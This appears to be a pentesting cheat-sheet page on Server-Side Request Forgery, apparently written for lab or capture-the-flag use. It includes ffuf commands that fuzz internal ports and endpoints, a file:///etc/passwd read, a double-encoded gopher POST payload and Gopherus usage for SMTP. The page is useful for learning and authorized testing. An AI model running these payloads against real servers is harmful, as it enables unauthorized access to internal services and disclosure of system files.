---
layout: default
title: SSRF
permalink: /Web/ssrf/
---

# Server-Side Request Forgery (SSRF)
This type of vulnerability occurs when an attacker can manipulate a web application into sending unauthorized requests from the server, because the web application fetches additional resources from a remote location based on user-supplied data, such as a URL.<br>
The following URL schemes are commonly used in the exploitation of SSRF vulnerabilities:
- http:// and https://: These URL schemes fetch content via HTTP/S requests. An attacker might use this in the exploitation of SSRF vulnerabilities to bypass WAFs, access restricted endpoints, or access endpoints in the internal network.
- file://: This URL scheme reads a file from the local file system. An attacker might use this in the exploitation of SSRF vulnerabilities to read local files on the web server (LFI).
- gopher://: This protocol can send arbitrary bytes to the specified address. An attacker might use this in the exploitation of SSRF vulnerabilities to send HTTP POST requests with arbitrary payloads or communicate with other services such as SMTP servers or databases.

## Confirming SSRF
- Supply a URL pointing to our system to the web aaplication, while we are listening with e.g. netcat.
- To determine, whether the HTTP response reflects the response, we can point the web application to itself, e.g. `http://127.0.0.1/index.php`.
If we see the HTML code in the response, the SSFR is not blind.

## Enumerating the System
We can do this using a fuzzer like ffuf.
```
seq 1 10000 > ports.txt
```
```
ffuf -w ./ports.txt -u http://$ip/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "<response_identifier_for_closed_port>"
```
*Note: First check the error message in case of a closed port to apply the `-fr` regex filter correctly.*

## Accessing Restricted Endpoints
First determine the web server's response when we access a non-existing page. We should also find the correct extension of the files as we can see in the `$extension` variable.
```
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://$ip/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.$extension&date=2024-01-01" -fr "<response_identifier_for_non_existing_page>"
```
## Local File Inclusion (LFI)
We can attempt to read local files from the file system using the `file://` URL scheme. E.g. by supplying the URL `file:///etc/passwd`

## The gopher Protocol
We can use SSRF to access restricted internal endpoints, but we are restricted to GET requests as there is no way to send a POST request with the http:// URL scheme. <br>
Instead, we can use the gopher URL scheme to send arbitrary bytes to a TCP socket. This protocol enables us to create a POST request by building the HTTP request ourselves by URL encoding the request, e.g.
```
POST /login.php HTTP/1.1
Host: <url>
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

password=admin
```
Afterward, we need to prefix the data with the gopher URL scheme, the target host and port, and an underscore, resulting in the following gopher URL:
```
gopher://<url>:80/_POST%20/...[SNIP]
```
Our specified bytes are sent to the target when the web application processes this URL. Since we carefully chose the bytes to represent a valid POST request, the internal web server accepts our POST request and responds accordingly. However, since we are sending our URL within the HTTP POST parameter dateserver, which itself is URL-encoded, we need to URL-encode the entire URL again to ensure the correct format of the URL after the web server accepts it. Otherwise, we will get a Malformed URL error. After URL encoding the entire gopher URL one more time, we can finally send the following request:
```
POST /index.php HTTP/1.1
Host: <ip>
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//<url>%3a80/_POST%2520/...[SNIP]
```
*Note: We can use the gopher protocol to interact with many internal services, not just HTTP servers.*

### Gopherus
We can utilize the tool [Gopherus](https://github.com/tarunkant/Gopherus) to generate gopher URLs for us. To run the tool, we need a valid Python2 installation. 
```
python2.7 gopherus.py
```
Example:
```
python2.7 gopherus.py --exploit smtp
```


